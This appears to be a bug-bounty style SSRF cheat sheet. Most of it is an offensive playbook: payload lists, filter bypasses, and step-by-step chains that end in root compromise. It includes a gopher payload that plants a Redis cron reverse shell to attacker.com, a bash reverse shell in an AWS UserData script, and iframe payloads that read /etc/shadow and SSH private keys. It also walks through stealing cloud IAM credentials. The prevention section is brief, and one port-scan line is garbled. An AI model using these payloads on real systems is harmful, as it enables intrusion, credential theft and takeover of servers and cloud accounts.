---
title: Server-Side Request Forgery (SSRF)
---

# Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) is a web vulnerability that allows an attacker to induce the server-side application to make unintended HTTP/TCP requests to arbitrary destinations. The server acts as a proxy for the attacker, enabling access to internal networks, cloud metadata, local files, or external services that are normally unreachable from the outside.

## Types of SSRF Attacks

### 1. Full SSRF

- The server returns the full response of the back-end request in the front-end response.
- Attacker can directly read internal files, metadata, admin panels, etc.
- Highest impact – often leads to data disclosure or RCE.

### 2. Blind SSRF

- No response is returned to the attacker (or only a boolean/status change).
- Requires Out-of-Band (OOB) techniques (Burp Collaborator, Interactsh, your own server) to detect.
- Harder to exploit but still dangerous (port scanning, metadata exfiltration, RCE via gopher).

## **Fundamentals of SSRF**

- SSRF occurs when a server makes HTTP/TCP requests based on **user-controlled input** without proper validation or restriction
- The key requirement is a **request-sink feature**, such as:
    
    ```
    URL fetchers, webhooks, image/PDF fetch, import-from-URL, file downloaders, link preview
    ```
    
- Attacker-controlled input is typically passed into backend request functions like:
    
    ```
    http://, https://, file://, gopher:// (in some stacks)
    ```
    
- SSRF relies on the server having **network reachability to internal or external systems**, including:
    
    ```
    localhost (127.0.0.1)
    private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
    cloud metadata services (169.254.169.254)
    internal admin panels/services
    ```
    
- The vulnerability is usually triggered when input is used in:
    
    ```
    GET request parameters
    POST body (JSON/XML/form-data)
    headers (Host, Referer, URL fields)
    ```
    
- SSRF impact depends on **server network privileges**, not the attacker’s local access
- Applications are especially vulnerable when they:
    
    ```
    do not validate URLs
    allow full URL input from users
    perform server-side fetching without allowlist restrictions
    ```
    
- SSRF can often be chained with:
    
    ```
    open redirect → internal scanning
    DNS rebinding → bypass filters
    cloud metadata access → credential theft
    protocol abuse → gopher/file schemes
    ```
    
- Detection often starts by modifying request destinations to:
    
    ```
    localhost, 127.0.0.1, internal IPs, or collaborator URLs
    ```
    
- A key indicator is when the server **initiates a request on behalf of the user without strict destination control**

### Basic Payloads

```bash
http://127.0.0.1
http://localhost
http://localhost:8080
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

### Protocol-Based Payloads

Once basic HTTP/HTTPS SSRF is confirmed and filters are bypassed, escalate using non-HTTP protocols supported by the vulnerable language/library (cURL, Java URL, PHP streams, etc.).

**1. file:// – Local File Read**

Directly access files on the server filesystem.

```bash
file:///etc/passwd
file:///proc/self/environ
file:///var/log/apache2/access.log
file:///app/config.php
```

**2. dict:// – DICT Protocol Interaction**

Useful when dict:// is allowed. Can leak server info or authenticate to internal DICT servers.

```bash
dict://127.0.0.1:11211/stats
dict://user:pass@internal-dict:2628/d:word:database:1
```

**3. sftp:// – Force Connection to Malicious SFTP**

Triggers connection to attacker-controlled SFTP server (great for OOB confirmation).

```jsx
sftp://your-server.com:2222/
```

**4. tftp:// – UDP-Based File Retrieval**

cURL supports TFTP. Send UDP packet to any internal host.

```bash
tftp://192.168.0.10:69/TESTUDPPACKET
tftp://127.0.0.1:69/boot.ini
```

**5. ldap://  – LDAP Query Execution**

Interact with internal LDAP servers (e.g., Memcached via LDAP wrapper).

text

```bash
ldap://127.0.0.1:11211/%0astats%0aquit
ldaps://internal-ldap.corp:636/dc=corp,dc=com
```

**6. SMTP via gopher:// – Send Emails from Internal Server**

Exploit internal mail servers (Sendmail, Postfix) to spoof emails or extract internal hostnames from banner.

```bash
gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM:%3Chacker@evil.com%3E%0d%0aRCPT%20TO:%3Cvictim@corp.com%3E%0d%0aDATA%0d%0aSubject:%20SSRF%20Test%0d%0a%0d%0aPwned%20:%29%0d%0a.%0d%0aQUIT%0d%0a
```

→ Banner often leaks internal domain: `220 mail.internal.corp ESMTP`

**7. gopher:// – Universal TCP Client** 

Send raw bytes to any TCP service (Redis, MySQL, PostgreSQL, FastCGI, HTTP, etc.).

**HTTP Request**

```bash
gopher://127.0.0.1:8080/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0a
gopher://127.0.0.1:8000/_POST%20/login%20HTTP/1.1%0d%0aHost:%20localhost%0d%0aCookie:%20admin=true%0d%0a%0d%0ausername=admin%27%20or%201=1--
```

**Redis RCE** 

```bash
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$%d%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0d%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$%d%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**MySQL (port 3306) – Dump users**

```bash
gopher://127.0.0.1:3306/_J%00%00%01%8d%a6%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00username%00%00mysql_native_password%00...
```

**8. curl URL Globbing + file:// – WAF/Path Filter Bypass**

When file:// is blocked but curl is used under the hood.

```bash
file:///app/{.,}./{.,}./{.,}./flag.txt
file:///etc/{passwd,shadow,hosts}
```

## Attack Surface

Common places where SSRF appears:

- **Import functionalities**
Many apps let you import an image or file by giving a URL – the server fetches it for you, so you can make the server fetch any URL you want.
Example: Avatar upload page has POST `/api/import-avatar?url=https://i.imgur.com/cat.jpg` → change to `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- **Back-end API proxy endpoints**
The front-end sends a URL to the back-end to check if an item is in stock, so you can replace that URL with anything.
Example: Normal request `stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1` → change to `stockApi=http://localhost/admin/deleteUsers`
- **Webhooks integrations**
Apps like Slack, Discord, or internal tools let you register a webhook URL where they will POST data you control the URL, so the server will request whatever you put there.
Example: In settings you set webhook = `https://your-collaborator.com` → every time an event happens, the server pings your internal metadata or admin panel instead.
- **URL preview / link expansion**
When you paste a link in chat, ticket system, or social media, the server fetches the page to generate a preview (title, image, etc.).
Example: You paste `http://127.0.0.1:8080/debug` in a company Slack or Jira ticket → server fetches it and may leak internal data.
- **File upload with remote fetching**
Some sites have “**Upload from URL**” instead of only local files – they download whatever URL you give them.
Example: “**Add document from web**” → you enter `http://192.168.0.68/admin` → server downloads the admin panel source code and shows/saves it.
- **XML / SOAP / GraphQL endpoints accepting external entities**
When the app parses XML you send, it may resolve external URLs inside the XML (XXE → SSRF).
Example: You send the below payload and then the server fetches AWS metadata.
    
    ```xml
    <?xml *version*="1.0"?>
    <!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>
    <root>&xxe;</root>
    ```
    
- **Referer header analytics**
Some internal analytics tools automatically visit every URL that appears in the HTTP Referer header of incoming requests.
Example: You visit `https://target.com/` with header
`Referer: http://169.254.169.254/latest/meta-data/iam/security-credentials/`
→ analytics server fetches it for you → blind SSRF.
- **Cloud metadata endpoints**
Almost every cloud instance (AWS, GCP, Azure, DigitalOcean, etc.) has a magic IP 169.254.169.254 that only works from inside the machine and gives secret keys.
Example: If you can make the server request `http://169.254.169.254/latest/meta-data/iam/security-credentials/YourRole`, you instantly steal AWS keys that often have full admin rights.

## Bypassing Defenses

### Blacklist-based Bypasses

1. **Alternative IP Notations**
Blacklists usually only block dotted decimal format. Converting the same IP to decimal, octal or hexadecimal completely evades string/regex-based filters while the HTTP client still understands it perfectly.
    
    ```
    2130706433                  → 127.0.0.1 (decimal)
    017700000001                → 127.0.0.1 (octal)
    0x7f000001                  → 127.0.0.1 (hex)
    0xc0a80001                  → 192.168.0.1
    2852039166                  → 169.254.169.254
    ```
    
2. **CIDR / Loopback Range Abuse**
The entire 127.0.0.0/8 range points to localhost. Most blacklists only block 127.0.0.1, so any other address in this range works.
    
    ```
    http://127.127.127.127
    http://127.0.1.3
    http://127.0.0.0
    ```
    
3. **Shortened & Rare Forms**
Some parsers accept incomplete or malformed IPs that still resolve to loopback.
    
    ```
    http://127.1
    http://127.0.1
    http://0/
    localhost:+11211aaa
    localhost:00011211aaaa
    ```
    
4. **Mixed & Weird Encodings**
Full-width characters, mixed bases, or unusual dot symbols are invisible to most blacklist regexes.
    
    ```
    127。0。0。1                     (full-width dots)
    127%E3%80%820%E3%80%820%E3%80%821
    0xA9.0xFE.0251.0376            (mixed hex/decimal/octal)
    169.254.43518                  (partial decimal class B)
    ```
    
5. **DNS Rebinding & Loopback Domains**
Domains that resolve to 127.0.0.1 or 169.254.169.254 are almost never blacklisted.
    
    ```
    localtest.me                → 127.0.0.1
    127.0.0.1.nip.io
    bugbounty.dod.network       → 127.0.0.2
    1ynrnhl.xip.io              → 169.254.169.254
    spoofed.burpcollaborator.net
    ```
    
6. **Enclosed Alphanumeric & Unicode Hosts**
Unicode circled/full-width letters look like normal text but are treated as valid hostnames by many parsers.
    
    ```
    http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ
    http://ｌｏｃａｌｈｏｓｔ
    ```
    
7. **IPv6 Hostname Tricks (Linux)**
/etc/hosts contains alternative names for ::1 that are rarely blocked.
    
    ```
    http://ip6-localhost
    http://ip6-loopback
    ```
    
8. **URL Encoding on Path**
After a whitelisted host, encoded slashes or paths are often ignored by filters.
    
    ```
    http://allowed.com/%61dmin
    http://allowed.com/%2561dmin
    ```
    

### Whitelist-based Bypasses

1. **Embedded Credentials & @ Confusion**
Most validators extract everything before the final @. HTTP clients use everything after it → perfect mismatch.
    
    ```
    http://legit.com@evil.com
    http://legit.com:pass@192.168.0.68
    http://legit.com#@evil.com
    ```
    
2. **URL Fragment Injection**
The fragment (#…) is stripped before the request is made, but naive whitelists see the allowed domain inside it.
    
    ```
    http://192.168.0.68#legit.com
    http://169.254.169.254/latest/meta-data/#legit.com
    http://evil.com%23@legit.com
    ```
    
3. **DNS Hierarchy & Subdomain Injection**
Whitelists that check domain.endsWith("legit.com") or domain.contains("legit.com") can be fooled by registering legit.com.evil.com.
    
    ```
    http://legit.com.evil.com
    http://legit.com.attacker-controlled.com
    ```
    
4. **Parser Discrepancy & Special Characters**
Validation library and actual HTTP client disagree on backslashes, brackets, encoded characters, etc.
    
    ```
    https://evil.com\legit.com
    https://evil.com#@legit.com
    https://[fe80::1%25eth0]
    https://example.com[@evil.com
    http://127.1.1.1:80\@127.2.2.2:80/
    http://127.1.1.1:80#\@127.2.2.2:80/
    ```
    
5. **Path / Extension After Allowed Host**
Filters that only validate the hostname ignore fragments and encoded traversals.
    
    ```
    http://legit.com/#/admin
    http://legit.com#.jpg
    http://legit.com/..%2f..%2f169.254.169.254/latest/meta-data/
    ```
    
6. **Parameter Pollution**
When the backend takes the last (or first) occurrence of a duplicated parameter, you can hide the malicious URL.
    
    ```
    url=legit.com&url=http://169.254.169.254
    next=legit.com&next=evil.com
    ```
    
7. **Host Header Injection**
Some backends trust the Host header over the URL hostname.
    
    ```
    Host: 127.0.0.1
    Host: [::1]
    ```
    
8. **Open Redirection Chaining**
Point to any open redirect inside a whitelisted domain → server follows 3xx after validation → reaches anything.
    
    ```
    stockApi=http://allowed.com/redirect?url=http://127.0.0.1/admin
    stockApi=http://allowed.com/redirect?next=http://169.254.169.254/
    ```
    
9. **JAR Scheme (Java only, blind)**
Java’s URL class accepts jar: URLs and fetches the inner URL silently.
    
    ```
    jar:http://127.0.0.1!/
    jar:https://169.254.169.254!/
    ```
    
10. **DNS Rebinding (time-based)**
The domain is configured to rapidly switch its resolved IP between your public server and the desired internal address (e.g., 127.0.0.1 or 169.254.169.254). Because the SSRF filter checks DNS once at validation time, one of the responses will point to the internal target, allowing the back-end request to reach otherwise blocked hosts.
    
    **Utility:** 1u.ms (free DNS rebinding service)
    **Example domain that rotates between 1.2.3.4 (your IP) and 169.254.169.254 (cloud metadata):**
    
    [`make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms`](http://make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms/)
    
    **Verification with nslookup (it flips on each query):**
    
    ```bash
    $ nslookup make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms
    Name:   make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms
    Address: 1.2.3.4
    
    $ nslookup make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms
    Name:   make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms
    Address: 169.254.169.254
    ```
    
    Works  against strict whitelists/blacklists when the TTL is low and the backend doesn’t cache DNS aggressively.
    
11. **Open Redirection Chaining (Self-hosted or Public)**
    
    **Self-hosted method**
    
    1. Deploy a simple redirect page on any whitelisted domain
    2. Point the SSRF to that page → it redirects to your internal target (e.g. 192.168.0.1)
    3. Use 307/308 to preserve original HTTP method and body
    
    **Zero-setup method (public redirectors – r3dir.me)**
    
    - 307 Temporary Redirect
        
        `https://307.r3dir.me/--to/?url=http://localhost`
        
        `https://307.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/`
        
    - 302 Found (random subdomain)
        
        `https://anything-you-want.302.r3dir.me   → http://169.254.169.254/latest/meta-data/`
        
    
    Just submit one of these URLs to the vulnerable parameter – filter passes, redirect executes, internal target reached.
    

## Advance Attack Scenarios

### 1. PDF Generation to Root Shell via SSRF + LFI

**Summary**
The PDF generator renders user-supplied content as raw HTML with high privileges and no sandbox. A single iframe gives full external SSRF + arbitrary local file read, often leading to instant root compromise.

**Affected Technologies**
wkhtmltopdf · PDFReacter · Puppeteer · Headless Chrome/Chromium · WeasyPrint · PrinceXML · Dompdf · mPDF · PhantomJS · Chrome Headless (older versions) · Any unsandboxed HTML-to-PDF converter

**Exploitation Steps**

1. **Confirm raw HTML rendering**
Insert `"><img src=x onerror=alert(1)>` → generate PDF → JavaScript alert appears in the PDF → confirmed
2. **Confirm external request capability**
Insert `"><iframe src="https://YOUR-COLLAB.oastify.com"></iframe>` → generate PDF → you receive a callback → external SSRF confirmed
3. **Read any file on the server**
Insert any of the following, generate the PDF, and the file content will be displayed inside it:
    
    ```html
    "><iframe src="file:///etc/passwd" width=1000 height=1000></iframe>
    "><iframe src="file:///etc/shadow" width=1000 height=1000></iframe>
    "><iframe src="file:///root/.ssh/id_rsa" width=1000 height=1000></iframe>
    "><iframe src="file:///var/www/html/.env" width=1000 height=1000></iframe>
    "><iframe src="file:///proc/self/environ" width=1000 height=1000></iframe>
    ```
    
4. **Gain shell**
Copy the private key `id_rsa` from the PDF → SSH/login as root or application user
    
    ```html
    "><iframe src="file:///etc/passwd" width=1000 height=1000></iframe>
    "><iframe src="file:///root/.ssh/id_rsa" width=1000 height=1000></iframe>
    "><iframe src="file:///etc/shadow" width=1000 height=1000></iframe>
    ```
    

**Impact**
Many PDF export features rely on unsandboxed HTML renderers (e.g., wkhtmltopdf, PDFReacter, or headless Chromium) running with elevated privileges. When user input is rendered without proper sanitization, a single iframe grants external SSRF and unrestricted local file disclosure via the file:// scheme, frequently resulting in full server compromise

### 2. Blind SSRF Internal Port Scanning via Status Code Differentiation

**Summary**
When the SSRF is completely blind (no body, no timing difference), many back-ends still return different HTTP status codes or response lengths depending on whether the target port is open or closed. By forcing HTTPS-only requests and cycling through ports, you can silently enumerate all open internal services.

**Steps to Reproduce (Exact & Clear)**

1. **Identify the vulnerable parameter**
Example: `url=` or `link=` that the server fetches on your behalf.
2. **Force HTTPS and test a known open port**
Send: `https://127.0.0.1:443`
→ Note the exact HTTP status code and response length in Burp Repeater
(Typical open-port response: 200, 201, 301, 302 or very short body)
3. **Test a known closed port**
Send: `https://127.0.0.1:12345` (random high port)
→ Note the different status code / length
(Typical closed-port response: 400, 502, 504, 000 or significantly longer/shorter body)
4. **Start systematic port scan**
Replace PORT and fire one by one. Compare status code + response length against your open/closed baseline.
    
    ```html
    https://127.0.0.1:22
    https://127.0.0.1:25
    https://127.0.0.1:80
    https://127.0.0.1:443
    https://127.0.0.1:2222
    https://127.0.0.1:3306
    https://127.0.0.1:5432
    https://127.0.0.1:6379
    https://127.0.0.1:8080
    https://127.0 enorm.0.1:9200
    https://127.0.0.1:11211
    https://127.0.0.1:27017
    ```
    
     Any port that returns the “open” signature you recorded in step 2 is confirmed open.
    
5. **Optional: Scan internal IPs**
Same technique, just change the host:
`https://192.168.1.10:PORT
https://10.0.0.50:PORT
https://172.16.0.1:PORT`

**Impact**
Turns a zero-visibility blind SSRF into a full internal port scanner. Discovering Redis (6379), Elasticsearch (9200), internal admin panels (8080/8443), or cloud metadata (169.254.169.254) instantly escalates the finding from Medium → Critical.

### 3. Open Redirect to Full SSRF Escalation (Live Chat Proxy Chain)

**Summary**
Live chat integrations (LivePerson, Zendesk, Intercom, Freshchat, etc.) are often proxied through the application’s back-end. When the provider endpoint contains an open redirect (commonly via parameters like onlineURL, return_to, redirect_to) and the proxy follows redirects, an external open redirect is transformed into unrestricted SSRF originating from the main application domain.

**Exploitation Steps**

1. **Identify the chat proxy endpoint**
Search JavaScript assets for routes such as /chat, /support/chat, /messenger, or /livechat.
2. **Confirm back-end proxy behavior**
Access a non-existent path (e.g., https://target.com/chat/nonexistent) and observe error messages that disclose the third-party provider (LivePerson, Zendesk, etc.).
3. **Locate the provider’s open redirect parameter**
Common parameters:
    - LivePerson → `onlineURL`
    - Zendesk → `return_to`
    - Intercom → `redirect_to`
    - Freshchat → `redirect_uri`
4. **Construct the SSRF payload**
Force the back-end request to the provider URL that redirects to the internal target:
    
    ```html
    https://target.com/chat?cmd=file&file=visitorWantsToChat&onlineURL=http://169.254.169.254/latest/meta-data/&site=123456
    https://target.com/chat?return_to=http://127.0.0.1/admin
    https://target.com/chat?redirect_to=http://192.168.0.10:8080/debug
    ```
    
5. **Optional: Path traversal escape (LivePerson-specific)**
Break out of the /api/ base path using encoded backslashes
[`https://target.com/chat/a..\..\..\..\..\admin/?cmd=file&file=visitorWantsToChat&onlineURL=http://127.0.0.1/&site=123456`](https://target.com/chat/a..%5C..%5C..%5C..%5C..%5Cadmin/?cmd=file&file=visitorWantsToChat&onlineURL=http://127.0.0.1/&site=123456)

**Impact**
Completely bypasses all local SSRF mitigations because the initial request targets a legitimate, whitelisted third-party domain. Regularly yields access to internal administration interfaces, cloud instance metadata, databases, and cache services. One of the most effective and frequently rewarded SSRF escalation techniques in large-scale programs (Airbnb, Shopify, Uber, etc.).

### 4. SSRF to Root RCE via AWS IAM Abuse

**Summary**
A restricted SSRF that blocks private IPs can be bypassed by omitting the scheme. This grants access to the EC2 Instance Metadata Service (IMDSv1), leaking temporary IAM role credentials. These credentials are then used to overwrite the instance’s UserData with a malicious script. Restarting the instance executes the payload on boot, resulting in a root reverse shell — one of the most severe AWS escalation chains.

**Exploitation Steps** 

1. **Confirm SSRF and detect AWS environment**
Submit your OOB domain (e.g., Interactsh/Burp Collaborator). When the callback originates from an Amazon-owned IP range, you know the back-end runs on EC2.
2. **Bypass private-IP block using scheme-less request**
Most filters reject http://169.254.169.254 but allow raw hostnames.
Payload:
    
    `url=169.254.169.254/latest/meta-data/iam/security-credentials/`
    
    → Returns the attached IAM role name (e.g., ec2-ssm-role).
    
3. **Retrieve full temporary AWS credentials**
Query the role name discovered in step 2:
    
    `url=169.254.169.254/latest/meta-data/iam/security-credentials/ec2-ssm-role`
    
    → Response contains AccessKeyId, SecretAccessKey, and Token valid for ~6 hours.
    
4. **Configure stolen credentials locally**
    
    ```bash
    aws configure --profile ssrf-pwn 
    *# Paste AccessKeyId, SecretAccessKey, Token
    # Region from /latest/meta-data/placement/region*
    ```
    
5. **Inject malicious UserData for RCE on next boot**
UserData scripts execute as root during instance initialization.
Create reverse shell script (rev.sh):
    
    ```bash
    #!/bin/bash
    bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
    ```
    
    One-liner execution (using Pacu or manual):
    
    ```bash
    aws configure --profile ssrf-pwn
    # Paste AccessKeyId, SecretAccessKey, Token
    # Region from /latest/meta-data/placement/region
    ```
    
    Pacu one-liner (recommended):
    
    `run ec2__startup_shell_script --script rev.sh --instance-ids i-0123456789abcdef0`
    
6. **Optional: Full AWS account takeover**
If the role has iam:CreatePolicyVersion or iam:PutRolePolicy, attach AdministratorAccess → permanent backdoor.

**Impact**
Escalates a filtered SSRF to complete root-level compromise of the EC2 instance and potentially the entire AWS account when IMDSv1 is enabled.

## Detection Techniques

### Manual Testing

1. Crawl the entire application and list every parameter that accepts a full URL, hostname, or IP (including JSON bodies, headers, and JS variables).
2. Submit your personal Interactsh/Burp Collaborator URL (e.g., [https://abcd1234.oastify.com](https://abcd1234.oastify.com/)) and verify you receive a DNS/HTTP callback.
3. Replace the URL with [http://127.0.0.1](http://127.0.0.1/), [http://localhost](http://localhost/), and [http://0](http://0.0.0.0/); observe any change in response length, status code, or error message.
4. Force HTTPS and iterate common ports with https://127.0.0.1:PORT; note which ports return 200/201/301 vs 400/502/504.
5. For blind cases, append your OOB domain to the port (e.g., https://127.0.0.1:6379.your-subdomain.oastify.com) and check for callbacks.
6. Measure response time: closed ports usually return instantly, open ports often take 3-10 seconds longer.
7. Test internal RFC-1918 ranges: [http://192.168.0.1](http://192.168.0.1/), [http://10.0.0.1](http://10.0.0.1/), [http://172.16.0.1](http://172.16.0.1/), and watch for any deviation from the baseline response.
8. Query cloud metadata endpoints: [http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/) and [http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/).
9. Examine third-party widgets (LivePerson, Zendesk, Intercom, PDF generators, image proxies) and test their proxy endpoints directly.
10. Try other schemes: file:///etc/passwd, gopher://127.0.0.1:6379/…, dict://127.0.0.1:11211/stats, and ldap://127.0.0.1:389/.
11. Set a malicious Referer header (Referer: [http://169.254.169.254/](http://169.254.169.254/)) and check if any internal analytics service fetches it.
12. Identify any open redirect on a whitelisted domain and chain it with an internal target (e.g., ?redirect=[http://169.254.169.254/](http://169.254.169.254/)).
13. Repeat the entire process with all bypass techniques (decimal IPs, encoded dots, DNS rebinding domains, etc.) if basic payloads are blocked.

### Automated Tools

- https://github.com/Dancas93/SSRF-Scanner: Automates SSRF parameter discovery and testing.
    
    `python3 ssrf_scanner.py -u "https://target.com/page?url=test"`
    
- [Nuclei SSRF templates](https://github.com/projectdiscovery/nuclei): Fast SSRF detection using prebuilt templates.
`nuclei -u https://target.com -t ssrf/`
- [SSRFmap](https://github.com/swisskyrepo/SSRFmap): Detects and exploits SSRF, supports OOB callbacks.
`python3 [ssrfmap.py](http://ssrfmap.py/) -r request.txt -p url=http://127.0.0.1`
- [SSRF Scanner](https://github.com/Dancas93/SSRF-Scanner): Burp extension to Identify SSRF parameters in requests.

## Impact

- Full internal network reconnaissance and port scanning across private IP ranges, exposing hidden services and infrastructure layout.
- Retrieval of cloud instance metadata and temporary IAM/role credentials, often leading to complete compromise of the AWS, GCP, or Azure environment.
- Arbitrary local file disclosure, including source code, configuration files, private keys, and credentials.
- Remote code execution via exploitation of unprotected internal services (e.g., Redis, databases, message queues).
- Lateral movement and pivoting to other internal systems, enabling deeper network compromise and potential full infrastructure takeover.

## Prevention Techniques

- Enforce strict allow-listing of permitted domains and IP ranges while rejecting everything else by default.
- Block all private, reserved, and loopback IP ranges (RFC 1918, 169.254.0.0/16, 127.0.0.0/8, ::1, fc00::/7) at both application and network levels.
- Allow only required URL schemes (typically http:// and https://) and explicitly disable file://, gopher://, dict://, ftp://, sftp://, tftp://, ldap://, ldaps://, jar://, and data://.
- Never return raw third-party responses to clients and always parse, validate, and reformat expected data before use.
- Require authentication and authorization on every internal service (Redis, Memcached, databases, queues, etc.), even within private networks.
- Use hardened HTTP clients and URL parsers that reject non-canonical forms, private IPs, and unexpected schemes by default.

## Good to Read:

https://hackerone.com/reports/2262382

https://hackerone.com/reports/514224

https://hackerone.com/reports/341876

## References:

[https://medium.com/@armaanpathan/pdfreacter-ssrf-to-root-level-local-file-read-which-led-to-rce-eb460ffb3129](https://medium.com/@armaanpathan/pdfreacter-ssrf-to-root-level-local-file-read-which-led-to-rce-eb460ffb3129)

[http://payatu.com/blog/a-basic-approach-to-ssrf/](http://payatu.com/blog/a-basic-approach-to-ssrf/)

[https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html)

[https://heimdalsecurity.com/blog/server-side-request-forgery-attack/](https://heimdalsecurity.com/blog/server-side-request-forgery-attack/)

[https://github.com/devanshbatham/Awesome-Bugbounty-Writeups/blob/master/README.md#server-side-request-forgery-ssrf](https://github.com/devanshbatham/Awesome-Bugbounty-Writeups/blob/master/README.md#server-side-request-forgery-ssrf)

[https://hg8.sh/posts/bugbounty/ssrf-to-rce-aws/](https://hg8.sh/posts/bugbounty/ssrf-to-rce-aws/)

[https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html)

[https://www.evolvesecurity.com/blog-posts/how-to-prevent-server-side-request-forgery#preventing-ssrf-attacks](https://www.evolvesecurity.com/blog-posts/how-to-prevent-server-side-request-forgery#preventing-ssrf-attacks)

[https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)

[https://brightsec.com/blog/7-ssrf-mitigation-techniques-you-must-know/](https://brightsec.com/blog/7-ssrf-mitigation-techniques-you-must-know/)

[https://blog.codacy.com/server-side-request-forgery-ssrf-owasp-top-10](https://blog.codacy.com/server-side-request-forgery-ssrf-owasp-top-10)

[https://www.svix.com/resources/glossary/ssrf/](https://www.svix.com/resources/glossary/ssrf/)

[https://www.feroot.com/education-center/what-is-server-side-request-forgery-ssrf/](https://www.feroot.com/education-center/what-is-server-side-request-forgery-ssrf/)